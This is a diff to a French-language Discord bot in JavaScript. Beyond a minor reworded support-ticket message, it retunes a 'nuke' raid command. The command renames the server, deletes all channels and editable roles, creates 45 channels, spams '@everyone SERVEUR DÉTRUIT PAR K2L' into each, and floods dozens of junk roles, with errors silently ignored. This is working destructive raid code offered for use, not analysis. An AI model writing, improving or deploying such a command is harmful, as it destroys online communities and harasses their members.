@@ -452,7 +452,7 @@ client.on('messageCreate', async message => {
             .setColor('#2b2d31')
             .setTitle("🎟️ Support & Tickets")
             .setDescription(
-                "**Bienvenue dans votre espace dédié au support du serveur !**\n\n" +
+                "**Bienvenue dans votre espace dédié au support !**\n\n" +
                 "Sélectionnez ci-dessous la catégorie qui correspond à votre demande pour ouvrir un salon privé avec l'équipe.\n\n" +
                 "*Restez courtois et respectueux.* ⚖️"
             );
@@ -747,20 +747,15 @@ client.on('messageCreate', async message => {
 
     if (command === 'nuke') {
         if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
-        await message.reply("💥 **[NUKE TOTAL ULTRA-RAPIDE]** Saturation et destruction immédiate en cours...");
+        await message.reply("💥 **[NUKE TOTAL PRIORITÉ SPAM]** Destruction et saturation immédiate...");
         try {
-            await message.guild.setName('/yuza').catch(() => {});
+            await message.guild.setName('ez-raid').catch(() => {});
 
             const deletePromises = [
                 ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {})),
                 ...message.guild.roles.cache.filter(role => role.editable && role.id !== message.guild.id).map(role => role.delete().catch(() => {}))
             ];
             await Promise.all(deletePromises);
-
-            const rolePromises = [];
-            for (let r = 0; r < 40; r++) {
-                rolePromises.push(message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Nuke flood' }).catch(() => {}));
-            }
 
             const channelPromises = [];
             for (let i = 0; i < 45; i++) {
@@ -782,14 +777,19 @@ client.on('messageCreate', async message => {
                     }).then(async channel => {
                         const spamArray = [];
                         for (let j = 0; j < 12; j++) {
-                            spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {}));
+                            spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L').catch(() => {}));
                         }
                         await Promise.all(spamArray);
                     }).catch(() => {})
                 );
             }
 
-            await Promise.all([...rolePromises, ...channelPromises]);
+            await Promise.all(channelPromises);
+
+            for (let r = 0; r < 35; r++) {
+                message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Nuke flood' }).catch(() => {});
+            }
+
         } catch (error) {
             console.error("Erreur Nuke :", error);
         }
